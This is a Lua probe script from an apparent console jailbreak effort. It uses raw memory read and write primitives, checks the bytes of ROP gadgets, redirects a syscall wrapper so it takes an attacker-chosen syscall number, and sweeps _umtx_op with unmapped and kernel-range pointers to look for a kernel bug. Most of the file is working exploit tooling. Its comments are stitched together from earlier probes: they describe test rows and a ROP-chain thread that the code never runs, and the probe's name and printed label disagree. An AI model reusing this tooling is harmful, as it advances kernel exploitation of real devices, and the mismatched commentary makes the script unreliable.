-- CRASH_CLASS: HIGH (a child thread executes a stack-built ROP chain)
-- PROBE 163a: does _umtx_op validate the timeout pointer?
--
-- 162a showed ops 4 and 5 are real mutex operations: a zeroed word is locked,
-- the caller's thread id is written into it (0x18D9F), a word already holding an
-- owner returns -1, and NULL obj returns -1. The handler therefore reads obj and
-- writes back into it.
--
-- In FreeBSD the mutex ops take a timeout object through uaddr2 (R8). If that
-- pointer is copied in without a range check, a kernel or unmapped address is
-- where the bug lives. This probe hands op 4/5:
--   uaddr2 = 0            (NULL)
--   uaddr2 = 0x1000       (unmapped low page)
--   uaddr2 = 0xFFFFF...   (kernel-shaped range)
--   obj = word + 1        (unaligned)
-- and records the return code plus whether the word was touched.
--
-- 158b left a contradiction. A thread with RAX = 432 (thr_self) and RDI = buf
-- wrote gettimeofday's seconds into buf, so the call through syscall_address
-- looked like 116 every time. But make_syscall(20) returns a real pid through
-- that same address on the main thread, and thr_create genuinely copies RAX
-- (158a stored 0x1234 from the context).
--
-- This probe asks the same question three ways in one run, with no nanosleep
-- and therefore no way to park the Lua thread:
--
--   A  make_syscall(20)                      -> pid?
--   B  make_syscall(116)                     -> timeval?
--   C  fcall(syscall_address, 432)(buf)      -> TID or timeval?
--   D  fcall(syscall_address, 20)            -> pid?
--   E  a thread with RAX = 432, RDI = buf    -> TID or timeval?
--
-- NOTE: 158a-158c entered at `wrapper`, which is `syscall_address - 7`, i.e. at
-- the `mov rax, 116` itself. That is why every thread call came back as
-- gettimeofday: the number was overwritten by the prologue before the syscall.
-- E here enters at `syscall_address`, past that mov.
--
-- C is the decisive row: it goes through the loader's own fcall, the path that
-- make_syscall uses, with a number the kernel answers visibly (thr_self writes
-- a thread id). If C writes a timeval, the address really is gettimeofday-only.
-- If C writes a TID, the main thread and the child differ and E isolates how.
--
-- 157a proved a thr_create(430) child can run libkernel's syscall wrapper in a
-- loop, but that wrapper has `mov rax, 116` in front of it, so the thread can
-- only ever call gettimeofday. The interesting syscalls (454 umtx, 560 kevent,
-- 97 socket) need their own number in RAX.
--
-- eboot has no `syscall` instruction (157a scanned 1 MB for 0F 05 C3), but
-- libkernel does, inside the same wrapper: `mov rax, 116; mov r10, rcx;
-- syscall; ret`. The `syscall; ret` tail can be entered directly.
--
-- libkernel .text cannot be read to find that tail, so the wrapper is entered
-- at syscall.syscall_address (past the `mov rax, 116`) with RAX supplied by the
-- thread context:
--
--   RIP = syscall_address   (mov r10, rcx; syscall; ret)
--   RAX = 20 (getpid), RDI = marker page, RSP -> [mov [rdi], rax; ret][jmp $]
--
-- A non-zero marker equal to the process pid proves three things at once: the
-- child executes, an arbitrary syscall number reaches the kernel, and the
-- return value comes back to us.
--
-- This is the step that turns 157a's curiosity into the tool the umtx race
-- needs: swap 20 for 454 and the marker page for a umtx word, and the thread is
-- inside a blocking syscall while the main thread acts.

print("=== PROBE 158c: WHICH SYSCALL NUMBER DOES THE THREAD ACTUALLY RUN? ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

---------------------------------------------------------------------------
-- [0] identity, eboot base, and the libkernel wrapper
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; the loader did not expose the wrapper")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo - 7))
print("[0] syscall_address=" .. q(SW) .. " wrapper=" .. q(wrapper))

-- libkernel .text is execute-only: reading even one byte of it kills the
-- process (this probe's first run died at the line below before it could print
-- a byte). So the wrapper is used, not inspected: syscall.syscall_address
-- already points past the `mov rax, 116`, at `mov r10, rcx; syscall; ret`, and
-- RAX comes from the thread context instead of from the wrapper.
local SysretKnown = false

---------------------------------------------------------------------------
-- [1] the two eboot gadgets, verified by byte before use
---------------------------------------------------------------------------
-- Known from 156d on this firmware; verified before use so a different build
-- cannot silently mis-execute.
local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
local function check4(a, b0, b1, b2, b3)
    return rb(a) == b0 and rb(a + 1) == b1 and rb(a + 2) == b2 and rb(a + 3) == b3
end
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[1] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

---------------------------------------------------------------------------
-- [2] timeout-pointer sweep
---------------------------------------------------------------------------
local umtx = make_syscall(454)

local function call(label, obj, op, val, a1, a2)
    local ok, rv = pcall(function()
        return umtx(obj, uint64(op), val,
            uint64(a1 or 0), uint64(a2 or 0), uint64(0))
    end)
    local txt = "nil"
    if ok and rv ~= nil then
        local okn, n = pcall(function() return rv:tonumber() end)
        txt = okn and string.format("0x%X/%d", n, n) or tostring(rv)
    end
    print(string.format("[2] %-30s ok=%s rv=%s", label, tostring(ok), txt))
    return ok
end

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local a1 = page(0x18)
local kernel_ptr = uint64(string.format("0x%X%08X", 0xFFFFF000, 0x00000000))
local cases = {
    { "uaddr2=NULL",        0,                    0 },
    { "uaddr2=0x1000",      0x1000,               0 },
    { "uaddr2=kernel range", kernel_ptr,          0 },
}

for _, op in ipairs({ 4, 5 }) do
    print("")
    print("-- op " .. op)
    for _, c in ipairs(cases) do
        local w = page(0x18)
        call(string.format("op%d %s", op, c[1]), uint64(w), op, uint64(c[2]), a1, c[3])
        print("      word=" .. q(rq(w)))
    end
    local w = page(0x18)
    wq(w + 8, uint64(0))
    call(string.format("op%d unaligned obj", op), uint64(w + 1), op, uint64(0), a1, 0)
    print("      word=" .. q(rq(w)) .. " word+8=" .. q(rq(w + 8)))
end

local ok5, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("")
print("[2] canary after sweep: ok=" .. tostring(ok5) .. " pid=" .. tostring(pid1))

print("")
print("=== PROBE 163a DONE ===")
